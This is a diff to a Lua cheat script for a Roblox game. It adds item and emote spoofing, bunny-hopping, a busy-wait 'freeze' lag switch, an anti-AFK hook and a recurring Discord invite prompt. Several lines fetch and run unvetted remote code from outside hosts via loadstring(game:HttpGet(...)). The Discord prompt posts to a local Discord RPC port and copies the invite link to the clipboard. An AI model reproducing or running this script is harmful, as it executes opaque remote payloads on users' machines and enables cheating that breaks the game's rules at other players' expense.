@@ -1,106 +1,138 @@
 local p, UIS, RS, VU = game.Players.LocalPlayer, game:GetService("UserInputService"), game:GetService("RunService"), game:GetService("VirtualUser")
 local bhop, freeze = false, false
+local fKN = "PageDown"
+local freezeMS = 300 
 
-local function notify(t, s)
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = t;
-        Text = s;
-        Duration = 1.5;
-    })
-end
-
-_G.emoteSwaps = {
-    { current = "APose", needed = "SnowmobileCruise" },
-}
-local function dl(u) task.spawn(function() pcall(function() loadstring(game:HttpGet(u))() end) end) end
-dl("https://api.luarmor.net/files/v3/loaders/36d5417f898691cb6c6d347b077e01e2.lua")
-
-pcall(function()
-    local S = game:GetService("ReplicatedStorage").Items
-    local function dup(p, o, n) local i = p:FindFirstChild(o) if i then i:Clone().Parent = p i.Name = n end end
-    dup(S.Emotes, "RockinStride", "Stride")
-    dup(S.Emotes, "Broom", "SnowmobileCruise")
-    dup(S.Cosmetics, "ToxicInferno", "BorealisAurora")
+-- [[ Module 1: Base Duplication ]]
+task.spawn(function()
+    _G.emoteSwaps = { { current = "APose", needed = "SnowmobileCruise" } }
+    local function dl(u) task.spawn(function() pcall(function() loadstring(game:HttpGet(u))() end) end) end
+    dl("https://api.luarmor.net/files/v3/loaders/36d5417f898691cb6c6d347b077e01e2.lua")
+    pcall(function()
+        local S = game:GetService("ReplicatedStorage").Items
+        local function dup(folder, old, new) 
+            local i = folder:FindFirstChild(old) 
+            if i then i:Clone().Parent = folder i.Name = new end 
+        end
+        dup(S.Emotes, "RockinStride", "Stride")
+        dup(S.Emotes, "Broom", "SnowmobileCruise")
+        dup(S.Cosmetics, "ToxicInferno", "BorealisAurora")
+    end)
+    p.Idled:Connect(function() VU:CaptureController() VU:ClickButton2(Vector2.zero) end)
 end)
 
-p.Idled:Connect(function() VU:CaptureController() VU:ClickButton2(Vector2.zero) end)
+-- [[ Module 2: DEEP Swap (Done/No need) ]]
+task.spawn(function()
+    task.wait(1.5) 
+    if #game.Players:GetPlayers() == 1 then
+        local E = game:GetService("ReplicatedStorage"):WaitForChild("Items"):WaitForChild("Emotes")
+        local s, r, b = E:FindFirstChild("Stride"), E:FindFirstChild("RockinStride"), E:FindFirstChild("Broom")
+        if s and r and b then
+            local bm, rm = b:FindFirstChild("EmoteModuleClassic"), r:FindFirstChild("EmoteModuleClassic")
+            if bm and rm then
+                local nm = bm:Clone()
+                nm:ClearAllChildren()
+                for _, o in ipairs(rm:GetChildren()) do o:Clone().Parent = nm end
+                rm:Destroy()
+                nm.Name, nm.Parent = "EmoteModuleClassic", r
+            end
+            s:ClearAllChildren()
+            for _, i in ipairs(r:GetChildren()) do i:Clone().Parent = s end
+            print("Done")
+        else print("No need") end
+    else print("No need") end
+end)
 
-local function run(c)
-    local h = c:WaitForChild("Head", 5)
-    if h then 
-        h.Transparency = 1 
-        for _, v in pairs(h:GetChildren()) do 
-            if v:IsA("Decal") then v.Transparency = 1 end 
-        end 
+-- [[ Module 3: Control & UI (Adjusted Position) ]]
+task.spawn(function()
+    local function run(c)
+        local h = c:WaitForChild("Head", 5)
+        if h then h.Transparency = 1 for _, v in pairs(h:GetChildren()) do if v:IsA("Decal") then v.Transparency = 1 end end end
+        task.wait(1)
+        pcall(function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Korblox-All-61127"))() end)
     end
-    task.wait(1)
-    dl("https://rawscripts.net/raw/Universal-Script-Korblox-All-61127")
-end
+    game.Players.PlayerAdded:Connect(function(plr) plr.CharacterAdded:Connect(run) end)
+    for _, v in pairs(game.Players:GetPlayers()) do if v.Character then task.spawn(run, v.Character) end v.CharacterAdded:Connect(run) end
 
-local function setupPlayer(plra)
-    plra.CharacterAdded:Connect(run)
-    if plra.Character then task.spawn(run, plra.Character) end
-end
+    UIS.InputBegan:Connect(function(i, g) if g then return end if i.KeyCode == Enum.KeyCode.Space then bhop = true elseif i.KeyCode.Name == fKN then freeze = true end end)
+    UIS.InputEnded:Connect(function(i) if i.KeyCode == Enum.KeyCode.Space then bhop = false elseif i.KeyCode.Name == fKN then freeze = false end end)
 
-game.Players.PlayerAdded:Connect(setupPlayer)
-for _, v in pairs(game.Players:GetPlayers()) do setupPlayer(v) end
+    RS.Heartbeat:Connect(function()
+        local c = p.Character
+        local r = c and c:FindFirstChild("HumanoidRootPart")
+        if bhop and c and c:FindFirstChildOfClass("Humanoid") and c:FindFirstChildOfClass("Humanoid").FloorMaterial ~= Enum.Material.Air then c:FindFirstChildOfClass("Humanoid"):ChangeState(3) end
+        if freeze and r then
+            if workspace:Raycast(r.Position, Vector3.new(0,-20,0)) then
+                local t = os.clock() 
+                local delayTime = (tonumber(freezeMS) or 300) / 1000
+                while os.clock() - t < delayTime do end 
+                game:GetService("StarterGui"):SetCore("SendNotification", { Title = "FREEZE"; Text = freezeMS .. "ms"; Duration = 0.5; })
+            end
+        end
+    end)
 
-UIS.InputBegan:Connect(function(i, g) 
-    if g then return end 
-    if i.KeyCode == Enum.KeyCode.Space then 
-        bhop = true 
-    elseif i.KeyCode == Enum.KeyCode.PageDown then 
-        freeze = true 
-    end 
+    local sg = Instance.new("ScreenGui", p.PlayerGui)
+    sg.Name = "KeybindMenu"
+    m = Instance.new("Frame", sg)
+    m.Size, m.Position = UDim2.new(0, 100, 0, 70), UDim2.new(0, 10, 0.3, 0)
+    m.BackgroundColor3, m.BackgroundTransparency, m.Active, m.Draggable = Color3.new(0,0,0), 0.5, true, true
+    
+    local l = Instance.new("TextButton", m)
+    l.Size, l.Position, l.Text = UDim2.new(1, -10, 0, 20), UDim2.new(0, 5, 0, 5), "Key: " .. fKN
+    l.BackgroundColor3, l.TextColor3, l.TextSize = Color3.new(0.2, 0.2, 0.2), Color3.new(1,1,1), 12
+    l.MouseButton1Click:Connect(function()
+        l.Text = "..."
+        local con; con = UIS.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.Keyboard then fKN = i.KeyCode.Name l.Text = "Key: " .. fKN con:Disconnect() end end)
+    end)
+    local st = Instance.new("TextLabel", m)
+    st.Size, st.Position, st.Text = UDim2.new(1, 0, 0, 15), UDim2.new(0, 0, 0, 28), "SET MS:"
+    st.BackgroundTransparency, st.TextColor3, st.TextSize = 1, Color3.new(0.8, 0.8, 0.8), 10
+    local tb = Instance.new("TextBox", m)
+    tb.Size, tb.Position = UDim2.new(1, -10, 0, 20), UDim2.new(0, 5, 0, 43)
+    tb.BackgroundColor3, tb.TextColor3, tb.Text = Color3.new(0.1, 0.1, 0.1), Color3.new(1, 1, 0), tostring(freezeMS)
+    tb.FocusLost:Connect(function()
+        local val = tonumber(tb.Text)
+        if val then freezeMS = math.clamp(val, 0, 5000) tb.Text = tostring(freezeMS)
+        else tb.Text = tostring(freezeMS) end
+    end)
 end)
-UIS.InputEnded:Connect(function(i) 
-    if i.KeyCode == Enum.KeyCode.Space then 
-        bhop = false 
-    elseif i.KeyCode == Enum.KeyCode.PageDown then 
-        freeze = false 
-    end 
-end)
 
-RS.Heartbeat:Connect(function()
-    local c = p.Character
-    local m, r = c and c:FindFirstChildOfClass("Humanoid"), c and c:FindFirstChild("HumanoidRootPart")
-    if bhop and m and m.FloorMaterial ~= Enum.Material.Air then m:ChangeState(3) end
-    if freeze and r then
-        local lp = RaycastParams.new() lp.FilterDescendantsInstances = {c}
-        if workspace:Raycast(r.Position, Vector3.new(0,-20,0), lp) or workspace:Raycast(r.Position, r.CFrame.LookVector*15, lp) then
-            local t = os.clock() while os.clock() - t < 0.3 do end
-            task.wait(0.05)
-            notify("FREEZE", "300MS")
-            task.wait(0.1)
+-- [[ Module 4: Enhanced Discord Invitation (Updated Link) ]]
+task.spawn(function()
+    local inviteUrl = "https://discord.gg/XF4PTA5Pgp"
+    local bindable = Instance.new("BindableFunction")
+    bindable.OnInvoke = function(answer)
+        if answer == "YES" then
+            local req = (syn and syn.request) or (http and http.request) or http_request or request
+            if req then
+                pcall(function()
+                    req({
+                        Url = "http://127.0.0.1:6463/rpc?v=1",
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json", ["Origin"] = "https://discord.com"},
+                        Body = game:GetService("HttpService"):JSONEncode({
+                            cmd = "INVITE_BROWSER",
+                            args = { code = "XF4PTA5Pgp" },
+                            nonce = game:GetService("HttpService"):GenerateGUID(false)
+                        }),
+                    })
+                end)
+            end
+            if setclipboard then setclipboard(inviteUrl) end
+            game:GetService("StarterGui"):SetCore("SendNotification", {Title = "SUCCESS"; Text = "Discord invite sent!"; Duration = 3;})
         end
     end
+    local function sendInvite()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "Discord Server";
+            Text = "Join our Discord for updates?";
+            Duration = 15;
+            Button1 = "YES";
+            Button2 = "NO";
+            Callback = bindable;
+        })
+    end
+    task.wait(4)
+    sendInvite()
+    while true do task.wait(1800) sendInvite() end
 end)
-
-local function PureContentSwap()
-    local isPrivate = game.PrivateServerId ~= "" or game.PrivateServerOwnerId ~= 0
-    local onlyMe = #game.Players:GetPlayers() == 1
-    
-    if not (isPrivate and onlyMe) then 
-        print("No need")
-        return 
-    end
-    
-    local E = game:GetService("ReplicatedStorage"):WaitForChild("Items"):WaitForChild("Emotes")
-    local s, r, b = E:FindFirstChild("Stride"), E:FindFirstChild("RockinStride"), E:FindFirstChild("Broom")
-    if not (s and r and b) then return end
-    
-    local bm, rm = b:FindFirstChild("EmoteModuleClassic"), r:FindFirstChild("EmoteModuleClassic")
-    if bm and rm then
-        local nm = bm:Clone()
-        nm:ClearAllChildren()
-        for _, o in ipairs(rm:GetChildren()) do o:Clone().Parent = nm end
-        rm:Destroy()
-        nm.Name, nm.Parent = "EmoteModuleClassic", r
-    end
-    
-    s:ClearAllChildren()
-    for _, i in ipairs(r:GetChildren()) do i:Clone().Parent = s end
-    print("Done")
-end
-
-PureContentSwap()
